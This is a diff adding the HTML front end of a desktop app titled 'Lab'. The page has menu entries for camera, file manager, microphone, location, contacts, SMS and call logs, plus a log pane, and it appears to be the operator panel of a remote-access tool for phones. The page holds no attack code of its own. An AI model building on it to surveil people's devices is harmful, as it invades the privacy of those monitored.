@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html ng-app="myappy">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <title>Lab</title>
+    <script>
+        if (typeof module === 'object') {
+            window.module = module;
+            module = undefined;
+        }
+    </script>
+
+
+    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="../node_modules/semantic-ui/dist/semantic.min.js"></script>
+    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
+    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
+    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
+    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
+    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>
+
+
+    <!-- Insert this line after script imports -->
+    <script>
+        if (window.module) module = window.module;
+    </script>
+
+    <link rel="stylesheet" href="assets/css/mystyle.css">
+    <link rel="stylesheet" href="../node_modules/semantic-ui/dist/semantic.min.css" />
+    <link rel="stylesheet" href="assets/css/leaflet.css" />
+
+</head>
+
+<body ng-controller="LabCtrl" class="draggable">
+
+    <div class="ui grid h80">
+        <div class="row h10">
+            <div class="sixteen wide column">
+                <div class="ui inverted mini text labeled icon menu">
+                    <a class="item">
+                        <img src="assets/img/icon.png" /> </a>
+                    <div class="right  menu notDraggable">
+                        <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="row h15 notDraggable">
+            <div class="sixteen wide column">
+                <div class="ui mini borderless labeled icon fluid seven item menu">
+                    <a class="item" ng-click="goToPage('camera')">
+                        <i class="red photo icon"></i> Camera
+                    </a>
+                    <a class="item" ng-click="goToPage('fileManager')">
+                        <i class=" teal folder icon "></i> File Manager
+                    </a>
+                    <a class="item" ng-click="goToPage('mic')">
+                        <i class="blue unmute icon "></i> Mic
+                    </a>
+                    <a class="item " ng-click="goToPage('location')">
+                        <i class="violet marker icon "></i> Location
+                    </a>
+                    <a class="item " ng-click="goToPage('contacts')">
+                        <i class="purple users icon "></i> contacts
+                    </a>
+                    <a class="item " ng-click="goToPage('smsManager')">
+                        <i class="grey talk outline icon "></i> SMS
+                    </a>
+                    <a class="item " ng-click="goToPage('callsLogs')">
+                        <i class="black call icon "></i> Calls Logs
+                    </a>
+                </div>
+
+            </div>
+        </div>
+
+
+
+
+        <div class="row centered h75 notDraggable ">
+            <div class="sixteen wide column">
+                <div class="ui segment full">
+                    <div ng-view class="full">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+    <div class="ui bottom attached black message h20 notDraggable " id="logy" style="overflow: scroll;">
+        <div ng-repeat="log in logs " class="log ">
+            <div class="w30 " style="display: inline-block " ng-bind="log.date "></div>
+            <div class="w65 " style="display: inline-block " ng-style="{ 'color':log.color} " ng-bind="log.msg "></div>
+        </div>
+    </div>
+</body>
+
+</html>
